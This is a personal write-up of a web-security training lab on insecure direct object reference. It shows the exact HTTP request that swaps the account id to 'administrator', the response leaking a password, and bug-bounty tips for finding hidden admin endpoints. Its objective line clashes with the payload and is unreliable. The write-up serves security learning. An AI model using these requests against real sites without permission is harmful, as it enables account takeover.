# LAB: User ID controlled by request parameter with password disclosure

| | |
|---|---|
| **Topic** | Access control (IDOR + information disclosure) |
| **Difficulty** | Apprentice |
| **Date** | 2026-11-14 |
| **Time** | 5 |
| **Solved without solution** | yes |
| **Link** | portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure |

## 1. Objective
Log in as `carlos` and delete his account. Direct id swapping is blocked.

## 2. Surface
`/my-account?id=<GUID>` with a redirect guard. The app also has
administrative functionality not exposed in my user's UI.

## 3. Hypothesis
If an admin-only endpoint exists but is only hidden in the UI, requesting it
with my session may work — and its response may contain more than expected.

## 4. Payload that worked
Request
```http
GET /my-account?id=administrator HTTP/2
Host: <Host>.web-security-academy.net
Cookie: session=<session>
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://<host>.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
Response
```
<input required type=password name=password value='hotqo4bjkb3l99mhu7pn'/>
```
## 5. Why it works
The application implements fragmented access controls. 
While the administrative features or direct profile links are omitted from the standard user interface, 
the underlying /my-account endpoint trusts the id parameter supplied by the client without enforcing server-side authorization checks. 
Consequently, when requested with an administrative identifier (id=administrator), 
the backend processes the request using the low-privileged user's session and inadvertently leaks sensitive profile information—including the pre-filled password value in the HTML form.

## 6. What I tried that failed
Attempting to access admin paths directly or browsing through hidden application paths without parameters, which resulted in access restrictions or redirects.

Analyzing page elements and waiting for data analysis/responses without initially specifying the correct target identifier parameter.

## 7. In a real target (bounty translation)
- Hidden admin functionality is a full class of finding: grep JS bundles and
  HTTP history for `admin`, `manage`, `delete`, `debug`, `test`.
- An admin endpoint that responds to a regular user's session is two findings
  in one: missing authorization + data disclosure. Report the chain.
- Impact: account takeover via leaked password → Critical.
- In the report: raw response with the leaked field highlighted + proof of login.

## 8. Bypass / variants noticed
Testing parameter pollution or swapping the id parameter values to other targets (id=carlos, id=wiener) to verify horizontal vs. vertical privilege escalation boundaries.

Inspecting alternative parameter names (e.g., user, uid, account) if standard ID fields are filtered.

## 9. Takeaway
UI hiding is not access control. Admin functionality visible only in code
history or JS is a standing invitation — enumerate what the UI does not show.
